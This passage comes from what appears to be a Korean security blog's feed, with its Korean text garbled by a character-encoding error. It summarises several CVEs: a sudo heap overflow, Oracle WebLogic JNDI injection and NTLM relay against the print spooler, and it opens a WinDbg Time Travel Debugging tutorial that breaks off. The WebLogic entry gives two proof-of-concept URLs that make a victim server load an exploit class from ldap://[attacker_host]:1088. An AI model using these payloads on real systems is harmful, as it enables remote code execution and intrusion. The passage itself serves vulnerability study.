íŒŒì¼ì´ í¬í•¨ëœ <a href="https://tldp.org/HOWTO/SquashFS-HOWTO/whatis.html">squashfs íŒŒì¼ ì‹œìŠ¤í…œ</a>ì„ ìƒì„±í•˜ì—¬ sudoers.dì— ì´ë¯¸ì§€ë¥¼ ë§ˆìš´íŠ¸ í•˜ë©´ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ ê¶Œí•œ ìƒìŠ¹ì´ ë˜ë”ë¼ë„ ì»¨í…Œì´ë„ˆ ì•ˆì— ì¡´ì¬í•˜ë¯€ë¡œ ë„ì»¤ë¥¼ escape í•´ì•¼ í•©ë‹ˆë‹¤. Azure Functionsì˜ ì»¨í…Œì´ë„ˆëŠ” <code>--privileged</code> ëª¨ë“œë¡œ ì‹¤í–‰ë˜ì–´ ì‹œìŠ¤í…œì˜ ëª¨ë“  ì¥ì¹˜ì— ì ‘ê·¼ ê°€ëŠ¥í•˜ë©° ì»¤ë„ì˜ ê¸°ëŠ¥ ëŒ€ë¶€ë¶„ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">í•´ë‹¹ ë¬¸ì„œ</a>ì— ì¡´ì¬í•˜ëŠ” ê¸°ë²•ì„ í†µí•˜ì—¬ Dockerì˜ hostì—ì„œ ëª…ë ¹ì–´ ìˆ˜í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>escape</tag>
      
      <tag>azure</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-3156 : heap overflow in sudo</title>
    <link href="/2021/01/27/fabu1ous/2021-01-27/"/>
    <url>/2021/01/27/fabu1ous/2021-01-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">CVE-2021-3156 : heap-based buffer overflow in sudo</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>sudo &lt; 1.9.5p2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Qualys Research Teamì—ì„œ CVE-2021-3156ì— ëŒ€í•œ ì„¸ë¶€ ì •ë³´ë¥¼ ê³µê°œí–ˆìŠµë‹ˆë‹¤. sudoëŠ” ì ì‹œ ë‹¤ë¥¸ ìœ ì €ì˜ ê¶Œí•œì„ ê°–ê³  í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” ëª…ë ¹ì–´ë¡œ ê±°ì˜ ëª¨ë“  Unix ê³„ì—´ ìš´ì˜ì²´ì œì—ì„œ ì‚¬ìš©í•©ë‹ˆë‹¤. sudoì— Heap-based Buffer Overlow ì·¨ì•½ì ì´ ì¡´ì¬í•˜ì—¬ ì´ë¥¼ í†µí•´ root ê¶Œí•œìœ¼ë¡œ ìƒìŠ¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>sudoì— <code>-s</code> ì˜µì…˜ì„ ë¶™ì—¬ <code>MODE_SHELL</code> flagê°’ì„ ì„¤ì •í•˜ê±°ë‚˜ <code>-i</code> ì˜µì…˜ì„ ë¶™ì—¬ <code>MODE_LOGIN_SHELL</code> flagê°’ì„ ì„¤ì •í•˜ë©´ sudoì˜ <code>main()</code>ì—ì„œ argvë¥¼ ì¬ì„¤ì •í•©ë‹ˆë‹¤. ëª¨ë“  command line argumentì˜ meta-characterì•ì— <code>\</code>(ë°±ìŠ¬ë˜ì‰¬)ë¥¼ ì¶”ê°€í•´ escape í•œ ë’¤ í•˜ë‚˜ì˜ ë¬¸ìì—´ë¡œ ë¬¶ìŠµë‹ˆë‹¤(concatenate). ë§Œì•½ í•˜ë‚˜ë¡œ ë¬¶ì¸ command line argumentê°€ <code>\</code>ë¡œ ëë‚˜ë©´ </p><pre><code class="hljs routeros"><span class="hljs-built_in">..</span>.<span class="hljs-keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; <span class="hljs-built_in">..</span>. <span class="hljs-keyword">for</span> (<span class="hljs-keyword">to</span> = user_args, av = NewArgv + 1; (<span class="hljs-keyword">from</span> = <span class="hljs-number">*a</span>v); av++) &#123; <span class="hljs-keyword">while</span> (<span class="hljs-number">*f</span>rom) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-keyword">from</span>[0] == <span class="hljs-string">&#x27;\\&#x27;</span> &amp;&amp; !isspace((unsigned char)<span class="hljs-keyword">from</span>[1])) <span class="hljs-keyword">from</span>++; *<span class="hljs-keyword">to</span>++ = <span class="hljs-number">*f</span>rom++; &#125; *<span class="hljs-keyword">to</span>++ = <span class="hljs-string">&#x27; &#x27;</span>; &#125; <span class="hljs-built_in">..</span>. &#125;</code></pre><p>ì´ë¥¼ heap-based buffer(<code>user_args</code>)ì— ì˜®ê¸°ëŠ” ì‘ì—… ì¤‘ NULL-terminatorë¥¼ ë¬´ì‹œí•˜ê³  out-of-bound copyë¥¼ í•˜ê²Œ ë©ë‹ˆë‹¤.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.gastonsanchez.com/r4strings/metacharacters.html">https://www.gastonsanchez.com/r4strings/metacharacters.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>linux</tag>
      
      <tag>unix</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-2109 : ì˜¤ë¼í´ Weblogic Server ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/01/26/l0ch/2021-01-26/"/>
    <url>/2021/01/26/l0ch/2021-01-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw">Weblogic Server remote code execution vulnerability warning (CVE-2021-2109)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 ë° 14.1.1.0.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì˜¤ë¼í´ì´ ê°œë°œí•œ ìë°” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì„œë²„ì¸ Oracle WebLogic Serverì—ì„œ JNDI Injectionì„ í†µí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><blockquote><p>JNDI(Java Naming and Directory Interface) : ìë°” ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì™¸ë¶€ ë””ë ‰í„°ë¦¬ ì„œë¹„ìŠ¤ì— ì ‘ê·¼í•˜ê¸° ìœ„í•œ APIë¡œ, ì›ê²© ì„œë²„ì˜ ê°ì²´ë¥¼ bind í•´ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤.</p></blockquote><p>í•´ë‹¹ ì·¨ì•½ì ì€ ë‘ í´ë˜ìŠ¤ì—ì„œ ë°œìƒí•˜ë©° ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ì²« ë²ˆì§¸ í´ë˜ìŠ¤ì¸ <code>com.bea.console.handles.JndiBindingHandle</code> ì—ì„œëŠ” ë°”ì¸ë”©í•  JNDIì˜ <code>context</code>, <code>bindName</code>, <code>serverName</code> ì •ë³´ë¥¼ íŒŒë¼ë¯¸í„°ë¡œ ë°›ì•„ ì´ë¥¼ ì¸ìŠ¤í„´ìŠ¤í™” í•˜ê³  <code>JNDIBindingAction</code>ì—ì„œ ì²˜ë¦¬í•©ë‹ˆë‹¤. ê° íŒŒë¼ë¯¸í„°ì˜ ì˜ë¯¸ì™€ ê³µê²© ì¡°ê±´ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li><p><code>context</code> : ì›ê²© ë°”ì¸ë”©í•  JNDI ì„œë²„ í˜¸ìŠ¤íŠ¸</p><ul><li>JNDI ì„œë²„ë¡œ êµ¬ì„±í•œ í•´ì»¤ì˜ í˜¸ìŠ¤íŠ¸</li></ul></li><li><p><code>bindName</code>: ë°”ì¸ë”©í•  JNDI í´ë˜ìŠ¤ ì´ë¦„</p><ul><li>ì•…ì„± ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” java í´ë˜ìŠ¤ íŒŒì¼ ì´ë¦„</li></ul></li><li><p><code>serverName</code> : ë°”ì¸ë”©í•  ì„œë²„ ì´ë¦„</p><ul><li><code>AdminServer</code></li></ul></li><li><p>ê° í•„ë“œëŠ” ì„¸ë¯¸ì½œë¡  <code>;</code>ìœ¼ë¡œ êµ¬ë¶„ë©ë‹ˆë‹¤.</p><br></li></ul><p>í•´ì»¤ì˜ ì„œë²„ í¬íŠ¸ 1088ì— ì•…ì„± ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” java í´ë˜ìŠ¤ íŒŒì¼ <code>exploit</code> ì´ ì¡´ì¬í•œë‹¤ë©´ PoCëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(&quot;ldap://[attacker_host];1:1088/exploit;AdminServer&quot;)</span></code></pre><p>ë‘ ë²ˆì§¸  <code>com.bea.console.handles.JndiContextHandle</code> í´ë˜ìŠ¤ì—ì„œëŠ” <code>bindName</code>ì´ í¬í•¨ëœ <code>context</code>ì™€ <code>serverName</code>ë§Œì„ ë°›ì•„ ìœ„ì™€ ë™ì¼í•œ í™˜ê²½ì—ì„œ ë‹¤ìŒ PoCë¡œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/console.portal?_nfpb=true&amp;_pageLabel=EJBTestHomePage&amp;EJBTestHomePagehandle=com.bea.console.handles.JndiContextHandle(&quot;ldap://[attacker_host]:1088/exploit;AdminServer&quot;)</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/Al1ex/CVE-2021-2109">https://github.com/Al1ex/CVE-2021-2109</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>oracle</tag>
      
      <tag>jndi injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-1678 : MSRPC Printer Spooler Relay</title>
    <link href="/2021/01/25/idioth/2021-01-25/"/>
    <url>/2021/01/25/idioth/2021-01-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/?utm_content=sprout&utm_medium=soc&utm_source=twittere.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/">Security Advisory: MSRPC Printer Spooler Relay (CVE-2021-1678)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021ë…„ 1ì›” 12ì¼ íŒ¨ì¹˜ ì´ì „<ul><li>Windows 7, 8.1, 10</li><li>Windows Server 2008, 2012, 2016, 2019</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2021ë…„ 1ì›” 12ì¼ Patch Tuesdayì—ì„œ <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1678">CVE-2021-1678</a>ì´ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ í†µí•´ í•´ì»¤ëŠ” NTLM(<a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NT Lan Manager</a>) ì¸ì¦ ì„¸ì…˜ì„ ë¦´ë ˆì´ í•˜ì—¬ í”„ë¦°í„° ìŠ¤í’€ëŸ¬ MSRPC ì¸í„°í˜ì´ë¡œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>NTLM ë¦´ë ˆì´ëŠ” í•´ì»¤ê°€ í´ë¼ì´ì–¸íŠ¸ì™€ ì„œë²„ ì‚¬ì´ì—ì„œ ë©”ì‹œì§€ë‚˜ ì •ë³´ë“¤ì„ ì „ë‹¬í•©ë‹ˆë‹¤. í•´ì»¤ëŠ” í´ë¼ì´ì–¸íŠ¸ì¸ ì²™ í•˜ì§€ë§Œ, ì„œë²„ëŠ” í´ë¼ì´ì–¸íŠ¸ê°€ í•´ì»¤ì¸ì§€ ì•Œì§€ ëª»í•˜ë©° NTLM ì¸ì¦ ì¤‘ ì„œë²„ì—ì„œ ì œê³µí•œ ì •ë³´ë¥¼ í†µí•´ ì„œë²„ì— ì¸ì¦ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. NTLM ì¸ì¦ì€ ë³´í˜¸ ê¸°ëŠ¥ì´ ì—†ìœ¼ë©´ ëª¨ë“  í”„ë¡œí† ì½œì—ì„œ ë‹¤ë¥¸ í”„ë¡œí† ì½œë¡œ ë¦´ë ˆì´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ NTLM ë¦´ë ˆì´ ê³µê²©ì„ í†µí•´ MSRPCë¥¼ íƒ€ê²ŒíŒ…í•˜ì—¬ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤.</p><p>MSRPCëŠ” ì¸ì¦ì— ëŒ€í•œ <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/425a7c53-c33a-4868-8e5b-2a850d40dc73">ì—¬ëŸ¬ ê°€ì§€ ë‹¨ê³„</a>ê°€ ìˆì§€ë§Œ <code>RPC_C_AUTHN_LEVEL_CONNECT</code>ëŠ” ì‚¬ìš©ì ì¸ì¦ì„ í†µí•œ ì „ì†¡ì— ì•”í˜¸í™”ë‚˜ ì„œëª…ì„ í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ NTLM ë¦´ë ˆì´ ê³µê²©ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. RPC ì¸í„°í˜ì´ìŠ¤ ì¤‘ <code>IRemoteWinspool</code>ì€ íŒ¨í‚· ë³´ì•ˆì´ í•„ìš”í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ RPC ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>NTLM ì„¸ì…˜ì´ í•´ì»¤ì— ì˜í•´ ì œì–´ë˜ëŠ” ë¦´ë ˆì´ ë¨¸ì‹ ì— ì„¤ì •</li><li>í•´ì»¤ëŠ” <code>IRemoteWinspool</code> ì¸í„°í˜ì´ìŠ¤ì— ë°”ì¸ë”©í•˜ê³  <code>RPC_C_AUTHN_LEVEL_CONNECT</code> ê¶Œí•œì„ ì„ íƒ</li><li>NTLM ì¸ì¦ì´ RPC ì±„ë„ì—ì„œ í•´ì»¤ì— ì˜í•´ ë¦´ë ˆì´ ë¨</li><li>PrinterDemon ê³µê²© íë¦„ê³¼ ê°™ì´ PRC ëª…ë ¹ì´ ì‹¤í–‰ë¨:<ul><li><code>RpcAsyncInstallPrinterDriverFromPackage</code>(Opnum 62) - â€œgeneric/textâ€ í”„ë¦°í„° ë“œë¼ì´ë²„ ì„¤ì¹˜</li><li><code>RpcAsyncOpenPrinter</code> (Opnum 0)</li><li><code>RpcAsyncXcvData</code> (Opnum 33) - í¬íŠ¸ ì¶”ê°€</li><li><code>RpcAsyncAddPrinter</code> (Opnum 1) - ë“œë¼ì´ë²„ì— ë”°ë¥¸ í”„ë¦°í„° ì¶”ê°€</li><li><code>RpcAsyncStartDocPrinter</code> (Opnum 10) - ìƒˆ ë¬¸ì„œ ì‹œì‘</li><li><code>RpcAsyncWritePrinter</code> (Opnum 12) - ìƒˆ ë¬¸ì„œ ì‘ì„±</li></ul></li></ol><p>í•´ë‹¹ ì·¨ì•½ì ì€ <code>IRemoteWinspool</code>ì˜ <code>RpcManager::VerifyRpcValidProtocolSequence</code>ì—ì„œ <code>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</code> ì´ìƒì˜ ë ˆë²¨ì—ì„œë§Œ ì ‘ê·¼ ê°€ëŠ¥í•˜ë„ë¡ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.hackndo.com/ntlm-relay/#ntlm-relay">https://en.hackndo.com/ntlm-relay/#ntlm-relay</a></p><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>ntlm realy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ì‹œê°„ì„ ì—¬í–‰í•˜ëŠ” í•´ì»¤ë¥¼ ìœ„í•œ ì•ˆë‚´ì„œ Part1</title>
    <link href="/2021/01/24/fabu1ous/ttd-1/"/>
    <url>/2021/01/24/fabu1ous/ttd-1/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p>Time Travel Debugging(TTD)ëŠ” 2017ë…„ì— ê³µê°œëœ Windbg previewì˜ ê¸°ëŠ¥ì…ë‹ˆë‹¤. ê³µê°œëœ ì§€ 3ë…„ì´ë‚˜ ì§€ë‚¬ì§€ë§Œ ì•„ì§ í•œê¸€ë¡œ ëœ ìì„¸í•œ ë¬¸ì„œëŠ” ë³„ë¡œ ì—†ëŠ” ê±° ê°™ë”ë¼ê³ ìš”. windbg previewë¥¼ ì“´ë‹¤ê±°ë‚˜ TTDì˜ ì¡´ì¬ë¥¼ ì•„ëŠ” ì‚¬ëŒì´ ì ì–´ì„œ ê·¸ëŸ°ê°€ ì‹¶ê¸°ë„ í•˜ê³ â€¦ windbgë¡œ ë””ë²„ê¹…ì„ ì²˜ìŒ í•´ë³¸ë‹¤ê±°ë‚˜ ë””ë²„ê¹… ìì²´ë¥¼ ì²˜ìŒ ì‹œì‘í•˜ë ¤ëŠ” ì‚¬ëŒë“¤ì—ê² í•œê¸€ë¡œ ëœ ë¬¸ì„œê°€ ë¬¸í„±ì˜ ë†’ì´ë¥¼ ë‚®ì¶”ëŠ”ë° í° ë„ì›€ì´ ëœë‹¤ê³  ìƒê°í•©ë‹ˆë‹¤.</p><p>ê·¸ë˜ì„œ â€œë‚´ê°€ ë§Œë“¤ì–´ ë³´ì§€ ë­â€ë¼ëŠ” ìƒê°ìœ¼ë¡œ ì§ì ‘ ê³µë¶€í•´ë³´ë©´ì„œ ì‘ì„±í•´ë³¼ê¹Œ í•©ë‹ˆë‹¤.</p><p>ëŒ€ëµ Part 3ê¹Œì§€ ìƒê° ì¤‘ì´ê³ , Part 4ê¹Œì§€ ì¶”ê°€ë¡œ í•  ìˆ˜ë„ ìˆì–´ìš”.</p><ul><li>Part 1 : ê°„ë‹¨ ì†Œê°œ ë° ì²«ì¸ìƒ</li><li>Part 2 : êµ¬ë²„ì „ì˜ open sourceì—ì„œ ë°œìƒí•˜ëŠ” ë²„ê·¸ë¥¼ ì§ì ‘ ë¶„ì„í•´ë³´ëŠ” ì‹¤ìŠµ</li><li>Part 3 : í¬ë˜ì‰¬ ë¶„ì„ì— ì‚¬ìš©í•´ë³¸ ê²½í—˜ë‹´</li><li>Part 4 : JavaScriptë¥¼ ì´ìš©í•œ ìë™í™” ë° ê³ ì˜¤ì˜¤ê¸‰ ì‚¬ìš©ë²•</li></ul><h1 id="Time-Travel-Debugging"><a href="#Time-Travel-Debugging" class="headerlink" title="Time Travel Debugging"></a>Time Travel Debugging</h1><p><img src="/2021/01/24/fabu1ous/ttd-1/1.png"></p><p>ë¶ˆí˜„ë“¯ì´ ê³¼ê±°ì— ì €ì§€ë¥¸ ì‹¤ìˆ˜ ë•Œë¬¸ì— ì´ë¶ˆ í‚¥ì„ í•˜ê³  ì‹¶ì€ ê²½í—˜ì„ ëˆ„êµ¬ë‚˜ í•œ ë²ˆì¯¤ì€ í•´ë´¤ì„ê²ë‹ˆë‹¤. ê³¼ê±°ë¡œ ëŒì•„ê°€ ëª¨ë‘ ì—†ë˜ ì¼ë¡œ ë§Œë“¤ ìˆ˜ë§Œ ìˆë‹¤ë©´ ì–¼ë§ˆë‚˜ ì¢‹ì„ê¹Œìš”. ë¬¼ë¡  ê·¸ê²Œ ë¶ˆê°€ëŠ¥í•˜ë‹¤ëŠ” ì‚¬ì‹¤ì´ ë”ìš± ê°€ìŠ´ì„ í›„ë²¼ íŒŒë©° ì‚¬ëŒì„ ë¯¸ì¹˜ê²Œ ë§Œë“­ë‹ˆë‹¤. í•˜ì§€ë§Œ Microsoftì˜ Debugging ExperienceíŒ€ì€ Debuggingì˜ í•œì—ì„  ê³¼ê±°ë¡œ ëŒì•„ê°€ ì €ì§€ë¥¸ ì‹¤ìˆ˜ë¥¼ ë§ŒíšŒí•  ìˆ˜ ìˆê²Œ í•´ ì¤ë‹ˆë‹¤.</p><blockquote><p>Time Travel Debugging(TTD), is a tool that allows you to record an execution of your process running, then replay it later both forwards and backwards.</p></blockquote><p>TTDëŠ” í”„ë¡œì„¸ìŠ¤ì˜ ì‹¤í–‰ì„ â€œë˜ê°ê¸°(rewind)â€í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ë§¤ë²ˆ ë²„ê·¸ë¥¼ ì¬ êµ¬í˜„í•˜ëŠ” ë²ˆê±°ë¡œì›€ì„ ëœê³  ë””ë²„ê¹…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²Œë‹¤ê°€ MS ìŠ¤í† ì–´ì—ì„œ windbg previewë¥¼ ì„¤ì¹˜í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ TTDë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤ë‹ˆâ€¦</p><p><img src="/2021/01/24/fabu1ous/ttd-1/2.png"></p><p>ì•„ë‹ˆì•„ë‹ˆ ë¬´ë£Œë¼êµ¬ìš” ì†ë‹˜</p><h1 id="ê¸°ë³¸ì ì¸-ì‚¬ìš©ë²•"><a href="#ê¸°ë³¸ì ì¸-ì‚¬ìš©ë²•" class="headerlink" title="ê¸°ë³¸ì ì¸ ì‚¬ìš©ë²•"></a>ê¸°ë³¸ì ì¸ ì‚¬ìš©ë²•</h1><h2 id="ê´€ë¦¬ì-ê¶Œí•œìœ¼ë¡œ-ì‹¤í–‰"><a href="#ê´€ë¦¬ì-ê¶Œí•œìœ¼ë¡œ-ì‹¤í–‰" class="headerlink" title="ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰"></a>ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/3.png"></p><p>ë””ë²„ê¹… íƒ€ê²Ÿì˜ ì‹¤í–‰ì„ ë…¹í™”í•´ ë§Œë“¤ì–´ì§„ Trace file(ì´í•˜ <code>.run</code>)ì„ ì”¹ê³  ëœ¯ê³  ë§›ë³´ê³  ì¦ê¸´ë‹¤ëŠ” ê²Œ TTDì˜ ë§¤ë ¥ì…ë‹ˆë‹¤. ê·¸ì „ì— ìš°ì„  windbg previewë¥¼ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•˜ì…”ì•¼ í•©ë‹ˆë‹¤. Input/Output íŠ¸ë ˆì´ì‹±ì„ ê¸°ë¡í•˜ëŠ” ë””ë²„ê¹… ë°©ì‹ì€ ì´ë¯¸ ì¡´ì¬í•´ì™”ì§€ë§Œ TTDëŠ” ì´ë³´ë‹¤ ì¢€ ë” í™•ì¥ëœ ê°œë…ìœ¼ë¡œ, í”„ë¡œì„¸ìŠ¤ì˜ ëª¨ë“  ì‹¤í–‰ì„ ê¸°ë¡í•´ <code>.run</code>ì„ ë§Œë“¤ê¸° ë•Œë¬¸ì— ìƒëŒ€ì ìœ¼ë¡œ ë†’ì€ ê¶Œí•œì„ ìš”êµ¬í•©ë‹ˆë‹¤.</p><h2 id="Trace-file-ë…¹í™”í•˜ê¸°"><a href="#Trace-file-ë…¹í™”í•˜ê¸°" class="headerlink" title="Trace file ë…¹í™”í•˜ê¸°"></a>Trace file ë…¹í™”í•˜ê¸°</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/4.png"></p><p>[ìƒë‹¨ ë©”ë‰´] &gt; [íŒŒì¼] &gt; [Launch executable (advanced)] &gt; ì‹¤í–‰ íŒŒì¼ ì„ íƒ &gt; [Record with TTD ì²´í¬ ë°•ìŠ¤]</p><p>ë””ë²„ê¹… íƒ€ê²Ÿì´ ë  ì‹¤í–‰ íŒŒì¼ì„ ì„ íƒí•´ì¤€ ë’¤ Record with Time Trabel Debuggingë¥¼ ì²´í¬í•´ì£¼ì‹œë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/5.png"></p><p>ê¸°ë³¸ì ìœ¼ë¡œ <code>.run</code>íŒŒì¼ì€ <code>C:\\Users\\username\\Documents</code>ì— ë§Œë“¤ì–´ì§‘ë‹ˆë‹¤. ì›í•˜ì‹ ë‹¤ë©´ ìƒì„± ê²½ë¡œë¥¼ ë°”ê¾¸ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>.run</code>íŒŒì¼ì˜ ê²½ë¡œë¥¼ ì§€ì • í›„ Record ë²„íŠ¼ì„ ëˆ„ë¥´ì‹œë©´ í”„ë¡œì„¸ìŠ¤ì˜ ë…¹í™”ê°€ ì‹œì‘ë©ë‹ˆë‹¤.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/6.png"></p><p>íƒ€ê²Ÿì˜ ë…¹í™”ê°€ ì§„í–‰ë˜ê³  ìˆìŒì„ ì•Œë ¤ì£¼ëŠ” íŒì—…ì°½ì´ ëœ¬ë‹¤ë©´ ì •ìƒì ìœ¼ë¡œ ë…¹í™”ë˜ê³  ìˆë‹¤ëŠ” ëœ»ì…ë‹ˆë‹¤. ì´ íŒì—…ì°½ì—ì„  íƒ€ê²Ÿ í”„ë¡œì„¸ìŠ¤, ë…¹í™” ì»¤ë©˜ë“œë¥¼ ë³´ì—¬ì£¼ë©° ì´ ë…¹í™”ê°€ ì§„ì • ë‚´ê°€ ì›í•˜ëŠ” ë…¹í™”ê°€ ë§ëŠ”ì§€ ìµœì¢… í™•ì¸í•˜ì‹œë©´ ë©ë‹ˆë‹¤.</p><p>ë¬¼ë¡  ì´ íŒì—…ì°½ì´ ëœ¬ë‹¤ë©´ ê·¸ëŸ° ê±´ ì‹ ê²½ ì“°ì§€ ë§ˆì‹œê³  ìµœëŒ€í•œ ë¹¨ë¦¬ ë””ë²„ê¹…í•˜ê³ ì í•˜ëŠ” ì´ìŠˆë‚˜ ë²„ê·¸ë¥¼ ì¬í˜„í•´ì£¼ì…”ì•¼ í•©ë‹ˆë‹¤. ë‚˜ì¤‘ì— ì ì‹œ ë‹¤ë£° ë‹¨ì ì˜ ë‚´ìš©ì´ì§€ë§Œ ê°„ë‹¨íˆ ì„¤ëª…ë“œë¦¬ìë©´  <code>.run</code>íŒŒì¼ì´ í¬ê¸°ê°€ ìƒê°ë³´ë‹¤ ë¹¨ë¦¬ ì»¤ì§‘ë‹ˆë‹¤. ì´ ê¸€ì„ ì“°ê¸° ìœ„í•´ ì¬í˜„í•˜ëŠ”ë° ëŒ€ëµ 3~4ì´ˆ ì •ë„ ê±¸ë¦¬ëŠ” í¬ë˜ì‰¬ë¥¼ ë…¹í™”í–ˆê³  1.5GB í¬ê¸°ì˜ <code>.run</code>íŒŒì¼ì´ ë§Œë“¤ì–´ì¡ŒìŠµë‹ˆë‹¤. í‰ê· ì ìœ¼ë¡œ ì˜í™” í•œ í¸ì´ 1.5GBì…ë‹ˆë‹¤. ê±°ê¸°ë‹¤ ì¶”ê°€ë¡œ  